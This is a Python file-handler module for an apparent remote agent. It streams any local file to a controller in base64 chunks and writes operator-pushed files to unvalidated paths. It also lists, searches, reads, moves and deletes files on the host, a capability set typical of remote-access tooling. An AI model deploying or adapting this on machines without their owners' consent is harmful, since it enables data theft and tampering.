"""
File handler module
Handles file upload/download functionality and file operations
"""

import os
import base64
import time
from logging_utils import log_message

# File transfer buffers
FILE_TRANSFER_BUFFERS = {}

def send_file_chunked_to_controller(file_path, agent_id, destination_path=None):
    """Send file to controller in chunks."""
    try:
        if not os.path.exists(file_path):
            log_message(f"File not found: {file_path}", "error")
            return False
        
        file_size = os.path.getsize(file_path)
        chunk_size = 64 * 1024  # 64KB chunks
        
        log_message(f"Sending file: {file_path} ({file_size} bytes)")
        
        with open(file_path, 'rb') as f:
            chunk_number = 0
            total_chunks = (file_size + chunk_size - 1) // chunk_size
            
            while True:
                chunk_data = f.read(chunk_size)
                if not chunk_data:
                    break
                
                # Encode chunk
                encoded_chunk = base64.b64encode(chunk_data).decode('utf-8')
                
                # Send chunk
                chunk_info = {
                    'agent_id': agent_id,
                    'file_path': file_path,
                    'destination_path': destination_path or file_path,
                    'chunk_number': chunk_number,
                    'total_chunks': total_chunks,
                    'chunk_data': encoded_chunk,
                    'is_last_chunk': chunk_number == total_chunks - 1
                }
                
                try:
                    from socket_client import get_socket_client
                    sio = get_socket_client()
                    if sio and hasattr(sio, 'emit'):
                        sio.emit('file_chunk_to_controller', chunk_info)
                except Exception as e:
                    log_message(f"Failed to send chunk {chunk_number}: {e}", "error")
                    return False
                
                chunk_number += 1
                
                # Small delay to prevent overwhelming
                time.sleep(0.01)
        
        log_message(f"File sent successfully: {file_path}")
        return True
        
    except Exception as e:
        log_message(f"Error sending file {file_path}: {e}", "error")
        return False

def handle_file_upload(command_parts):
    """Handle file upload command."""
    if len(command_parts) < 2:
        log_message("Usage: upload <local_file_path> [remote_path]", "error")
        return
    
    local_path = command_parts[1]
    remote_path = command_parts[2] if len(command_parts) > 2 else None
    
    return send_file_chunked_to_controller(local_path, "agent", remote_path)

def handle_file_download(command_parts, agent_id):
    """Handle file download command."""
    if len(command_parts) < 2:
        log_message("Usage: download <remote_file_path> [local_path]", "error")
        return
    
    remote_path = command_parts[1]
    local_path = command_parts[2] if len(command_parts) > 2 else os.path.basename(remote_path)
    
    try:
        from socket_client import get_socket_client
        sio = get_socket_client()
        if sio and hasattr(sio, 'emit'):
            sio.emit('request_file_download', {
                'agent_id': agent_id,
                'remote_path': remote_path,
                'local_path': local_path
            })
            log_message(f"Requested file download: {remote_path} -> {local_path}")
            return True
    except Exception as e:
        log_message(f"Failed to request file download: {e}", "error")
        return False

def on_file_chunk_from_operator(data):
    """Handle file chunk received from operator."""
    try:
        agent_id = data.get('agent_id')
        file_id = data.get('file_id')
        chunk_number = data.get('chunk_number')
        total_chunks = data.get('total_chunks')
        chunk_data = data.get('chunk_data')
        destination_path = data.get('destination_path')
        is_last_chunk = data.get('is_last_chunk', False)
        
        if not all([agent_id, file_id is not None, chunk_number is not None, chunk_data, destination_path]):
            log_message("Invalid file chunk data received", "error")
            return
        
        # Initialize buffer for this file if needed
        if file_id not in FILE_TRANSFER_BUFFERS:
            FILE_TRANSFER_BUFFERS[file_id] = {
                'chunks': {},
                'destination_path': destination_path,
                'total_chunks': total_chunks,
                'received_chunks': 0
            }
        
        buffer_info = FILE_TRANSFER_BUFFERS[file_id]
        
        # Store chunk
        try:
            decoded_chunk = base64.b64decode(chunk_data)
            buffer_info['chunks'][chunk_number] = decoded_chunk
            buffer_info['received_chunks'] += 1
            
            log_message(f"Received chunk {chunk_number + 1}/{total_chunks} for file {file_id}")
            
        except Exception as e:
            log_message(f"Failed to decode chunk {chunk_number}: {e}", "error")
            return
        
        # Check if all chunks received
        if buffer_info['received_chunks'] >= buffer_info['total_chunks'] or is_last_chunk:
            log_message(f"All chunks received for file {file_id}, assembling...")
            
            # Assemble file
            try:
                file_data = b''
                for i in range(buffer_info['total_chunks']):
                    if i in buffer_info['chunks']:
                        file_data += buffer_info['chunks'][i]
                    else:
                        log_message(f"Missing chunk {i} for file {file_id}", "error")
                        return
                
                # Save file
                if _save_completed_file(buffer_info['destination_path'], file_data):
                    log_message(f"File saved successfully: {buffer_info['destination_path']}")
                    
                    # Send completion notification
                    try:
                        from socket_client import get_socket_client
                        sio = get_socket_client()
                        if sio and hasattr(sio, 'emit'):
                            sio.emit('file_transfer_complete', {
                                'agent_id': agent_id,
                                'file_id': file_id,
                                'status': 'success',
                                'destination_path': buffer_info['destination_path']
                            })
                    except:
                        pass
                else:
                    log_message(f"Failed to save file: {buffer_info['destination_path']}", "error")
                
                # Clean up buffer
                del FILE_TRANSFER_BUFFERS[file_id]
                
            except Exception as e:
                log_message(f"Failed to assemble file {file_id}: {e}", "error")
                # Clean up buffer on error
                if file_id in FILE_TRANSFER_BUFFERS:
                    del FILE_TRANSFER_BUFFERS[file_id]
        
    except Exception as e:
        log_message(f"Error handling file chunk: {e}", "error")

def _save_completed_file(destination_path, buffer_data):
    """Save completed file data to disk."""
    try:
        # Create directory if needed
        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
        
        # Write file
        with open(destination_path, 'wb') as f:
            f.write(buffer_data)
        
        log_message(f"File saved: {destination_path} ({len(buffer_data)} bytes)")
        return True
        
    except Exception as e:
        log_message(f"Failed to save file {destination_path}: {e}", "error")
        return False

def on_file_upload_complete_from_operator(data):
    """Handle file upload completion notification from operator."""
    try:
        agent_id = data.get('agent_id')
        file_path = data.get('file_path')
        status = data.get('status')
        
        if status == 'success':
            log_message(f"File upload completed successfully: {file_path}")
        else:
            error_message = data.get('error', 'Unknown error')
            log_message(f"File upload failed: {file_path} - {error_message}", "error")
            
    except Exception as e:
        log_message(f"Error handling file upload completion: {e}", "error")

def on_request_file_chunk_from_agent(data):
    """Handle request for file chunk from agent (for download)."""
    try:
        agent_id = data.get('agent_id')
        file_path = data.get('file_path')
        chunk_number = data.get('chunk_number', 0)
        chunk_size = data.get('chunk_size', 64 * 1024)  # 64KB default
        
        if not os.path.exists(file_path):
            # Send error response
            try:
                from socket_client import get_socket_client
                sio = get_socket_client()
                if sio and hasattr(sio, 'emit'):
                    sio.emit('file_download_error', {
                        'agent_id': agent_id,
                        'file_path': file_path,
                        'error': 'File not found'
                    })
            except:
                pass
            return
        
        try:
            file_size = os.path.getsize(file_path)
            total_chunks = (file_size + chunk_size - 1) // chunk_size
            
            # Read requested chunk
            with open(file_path, 'rb') as f:
                f.seek(chunk_number * chunk_size)
                chunk_data = f.read(chunk_size)
            
            if chunk_data:
                # Encode and send chunk
                encoded_chunk = base64.b64encode(chunk_data).decode('utf-8')
                
                chunk_info = {
                    'agent_id': agent_id,
                    'file_path': file_path,
                    'chunk_number': chunk_number,
                    'total_chunks': total_chunks,
                    'chunk_data': encoded_chunk,
                    'is_last_chunk': chunk_number >= total_chunks - 1,
                    'file_size': file_size
                }
                
                try:
                    from socket_client import get_socket_client
                    sio = get_socket_client()
                    if sio and hasattr(sio, 'emit'):
                        sio.emit('file_chunk_from_agent', chunk_info)
                except Exception as e:
                    log_message(f"Failed to send file chunk: {e}", "error")
            
        except Exception as e:
            log_message(f"Error reading file chunk: {e}", "error")
            # Send error response
            try:
                from socket_client import get_socket_client
                sio = get_socket_client()
                if sio and hasattr(sio, 'emit'):
                    sio.emit('file_download_error', {
                        'agent_id': agent_id,
                        'file_path': file_path,
                        'error': str(e)
                    })
            except:
                pass
        
    except Exception as e:
        log_message(f"Error handling file chunk request: {e}", "error")

def list_directory(path):
    """List directory contents."""
    try:
        if not os.path.exists(path):
            return None
        
        items = []
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            try:
                stat = os.stat(item_path)
                is_dir = os.path.isdir(item_path)
                
                items.append({
                    'name': item,
                    'path': item_path,
                    'is_directory': is_dir,
                    'size': stat.st_size if not is_dir else 0,
                    'modified': stat.st_mtime
                })
            except:
                # Skip items we can't access
                continue
        
        return sorted(items, key=lambda x: (not x['is_directory'], x['name'].lower()))
        
    except Exception as e:
        log_message(f"Error listing directory {path}: {e}", "error")
        return None

def get_file_info(file_path):
    """Get file information."""
    try:
        if not os.path.exists(file_path):
            return None
        
        stat = os.stat(file_path)
        
        return {
            'path': file_path,
            'name': os.path.basename(file_path),
            'size': stat.st_size,
            'modified': stat.st_mtime,
            'created': stat.st_ctime,
            'is_directory': os.path.isdir(file_path),
            'is_file': os.path.isfile(file_path),
            'permissions': oct(stat.st_mode)[-3:] if hasattr(stat, 'st_mode') else '000'
        }
        
    except Exception as e:
        log_message(f"Error getting file info for {file_path}: {e}", "error")
        return None

def create_directory(dir_path):
    """Create directory."""
    try:
        os.makedirs(dir_path, exist_ok=True)
        log_message(f"Directory created: {dir_path}")
        return True
    except Exception as e:
        log_message(f"Failed to create directory {dir_path}: {e}", "error")
        return False

def delete_file_or_directory(path):
    """Delete file or directory."""
    try:
        if os.path.isfile(path):
            os.remove(path)
            log_message(f"File deleted: {path}")
        elif os.path.isdir(path):
            import shutil
            shutil.rmtree(path)
            log_message(f"Directory deleted: {path}")
        else:
            log_message(f"Path not found: {path}", "error")
            return False
        
        return True
        
    except Exception as e:
        log_message(f"Failed to delete {path}: {e}", "error")
        return False

def move_file_or_directory(src_path, dst_path):
    """Move/rename file or directory."""
    try:
        import shutil
        shutil.move(src_path, dst_path)
        log_message(f"Moved: {src_path} -> {dst_path}")
        return True
    except Exception as e:
        log_message(f"Failed to move {src_path} to {dst_path}: {e}", "error")
        return False

def copy_file_or_directory(src_path, dst_path):
    """Copy file or directory."""
    try:
        import shutil
        
        if os.path.isfile(src_path):
            shutil.copy2(src_path, dst_path)
        elif os.path.isdir(src_path):
            shutil.copytree(src_path, dst_path)
        else:
            log_message(f"Source path not found: {src_path}", "error")
            return False
        
        log_message(f"Copied: {src_path} -> {dst_path}")
        return True
        
    except Exception as e:
        log_message(f"Failed to copy {src_path} to {dst_path}: {e}", "error")
        return False

def get_disk_usage(path):
    """Get disk usage for path."""
    try:
        import shutil
        total, used, free = shutil.disk_usage(path)
        
        return {
            'path': path,
            'total': total,
            'used': used,
            'free': free,
            'percent_used': (used / total) * 100 if total > 0 else 0
        }
        
    except Exception as e:
        log_message(f"Error getting disk usage for {path}: {e}", "error")
        return None

def search_files(search_path, pattern, recursive=True):
    """Search for files matching pattern."""
    try:
        import fnmatch
        
        matches = []
        
        if recursive:
            for root, dirs, files in os.walk(search_path):
                for filename in files:
                    if fnmatch.fnmatch(filename.lower(), pattern.lower()):
                        file_path = os.path.join(root, filename)
                        matches.append({
                            'path': file_path,
                            'name': filename,
                            'directory': root,
                            'size': os.path.getsize(file_path) if os.path.exists(file_path) else 0
                        })
        else:
            if os.path.isdir(search_path):
                for filename in os.listdir(search_path):
                    if fnmatch.fnmatch(filename.lower(), pattern.lower()):
                        file_path = os.path.join(search_path, filename)
                        if os.path.isfile(file_path):
                            matches.append({
                                'path': file_path,
                                'name': filename,
                                'directory': search_path,
                                'size': os.path.getsize(file_path)
                            })
        
        return matches
        
    except Exception as e:
        log_message(f"Error searching files in {search_path}: {e}", "error")
        return []

def read_file_content(file_path, max_size=1024*1024):  # 1MB max
    """Read and return file content (text files only)."""
    try:
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size > max_size:
            log_message(f"File too large to read: {file_path} ({file_size} bytes)", "warning")
            return None
        
        # Try to read as text
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return f.read()
        except UnicodeDecodeError:
            # Try with different encoding
            try:
                with open(file_path, 'r', encoding='latin-1') as f:
                    return f.read()
            except:
                log_message(f"Cannot read file as text: {file_path}", "warning")
                return None
        
    except Exception as e:
        log_message(f"Error reading file {file_path}: {e}", "error")
        return None

def write_file_content(file_path, content):
    """Write content to file."""
    try:
        # Create directory if needed
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        log_message(f"File written: {file_path}")
        return True
        
    except Exception as e:
        log_message(f"Error writing file {file_path}: {e}", "error")
        return False
